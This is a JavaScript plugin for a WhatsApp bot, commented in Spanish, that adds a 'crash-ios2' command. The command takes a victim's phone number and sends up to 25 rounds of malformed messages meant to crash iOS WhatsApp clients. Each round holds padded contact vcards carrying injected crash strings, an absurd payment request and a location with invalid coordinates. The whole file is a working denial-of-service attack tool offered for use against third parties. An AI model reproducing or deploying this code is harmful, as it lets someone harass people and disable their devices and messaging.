// plugins/crash-ios2.js

module.exports = {
    name: 'crash-ios2',
    alias: [],

    async execute(conn, m, args, context) {
        
        // 1. Extraemos las variables y funciones necesarias del 'context'
        const { isBot, isCreator, q, reply, prefix, sleep, ios6, generateMessageID , ios4} = context;

        // 2. Definimos la función de apoyo 'forcepotter' dentro del plugin
        async function forcepotter(target, count) {
            try {
                // Hacemos cada vcard única para el anti-spam
                const vcard = `
BEGIN:VCARD
VERSION:3.0
FN:🎠𝐏.𝐀. Ｚ𝐢𝐧 𝐖𝐞𝐛 </>${ios6} ${count}
ORG:𝐏𝐎𝐒𝐄𝐢𝐃𝐎𝐍 𝐕𝟏${ios6};
TEL;type=CELL;type=VOICE;waid=999999999999:+99 999-999
END:VCARD`.trim();

                const contactMsg = {
                    extendedTextMessage: {
                        text: `☕️ 𝐏.𝐀. Ｚ𝐢𝐧 𝐖𝐞𝐛 </>${ios6}`,
                        contextInfo: {
                            stanzaId: generateMessageID(),
                            participant: "0@s.whatsapp.net",
                            quotedMessage: {
                                contactMessage: {
                                    displayName: `🎠𝐏.𝐀. Ｚ𝐢𝐧 𝐖𝐞𝐛${ios6}`,
                                    vcard: vcard
                                }
                            }
                        }
                    }
                };

                const paymentMsg = {
                    requestPaymentMessage: {
                        currencyCodeIso4217: "BRL",
                        amount1000: "999999999",
                        requestFrom: target,
                        noteMessage: {
                            extendedTextMessage: {
                                text: "🎠𝐏.𝐀. Ｚ𝐢𝐧 𝐖𝐞𝐛 </>",
                                contextInfo: {
                                    stanzaId: generateMessageID(),
                                    participant: "0@s.whatsapp.net",
                                    quotedMessage: {
                                        contactMessage: {
                                            displayName: "🎠𝐏.𝐀. Ｚ𝐢𝐧 𝐖𝐞𝐛 </>",
                                            vcard: vcard
                                        }
                                    }
                                }
                            }
                        }
                    }
                };

                const locationMsg = {
                    locationMessage: {
                        degreesLatitude: 999,
                        degreesLongitude: 999,
                        name: `${ios4}`,
                        address: "Unknown"
                    }
                };
                
                // (Omití nestedContactMsg para simplificar, pero puedes añadirlo si es necesario)

                await conn.relayMessage(target, contactMsg, { messageId: generateMessageID() });
                await sleep(500);
                await conn.relayMessage(target, paymentMsg, { messageId: generateMessageID() });
                await sleep(500);
                await conn.relayMessage(target, locationMsg, { messageId: generateMessageID() });

            } catch (error) {
                console.error('Error en forcepotter:', error);
            }
        }

        // 3. Lógica principal del comando mejorada
        if (!isBot && !isCreator) return;
        if (!q) return reply(`Formato incorrecto.\n*Ejemplo:* ${prefix}crash-ios2 +5939xxxxxxxx,10`);

        let targetNumber;
        let cantidad = 1; // Default si solo se pone el número
        const limite = 25; // Límite máximo para este comando

        if (q.includes(',')) {
            const parts = q.split(',');
            targetNumber = parts[0].replace(/[^0-9]/g, '');
            const cantidadSolicitada = parseInt(parts[1].trim());

            if (!isNaN(cantidadSolicitada) && cantidadSolicitada > 0) {
                cantidad = Math.min(cantidadSolicitada, limite);
            }
        } else {
            targetNumber = q.replace(/[^0-9]/g, '');
        }

        if (!targetNumber) return reply('El número proporcionado no es válido.');
        
        const target = targetNumber + "@s.whatsapp.net";

        await reply(`> Iniciando envío a ${targetNumber}\n*Cantidad* : \`${cantidad}\``);

        for (let i = 0; i < cantidad; i++) {
            console.log(`[+] Enviando crash-ios2 #${i + 1} a ${targetNumber}`);
            // Pasamos el contador para hacer cada envío único
            await forcepotter(target, i + 1);
            await sleep(1500); // Pausa entre cada set de mensajes
        }
        
        conn.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
    }
};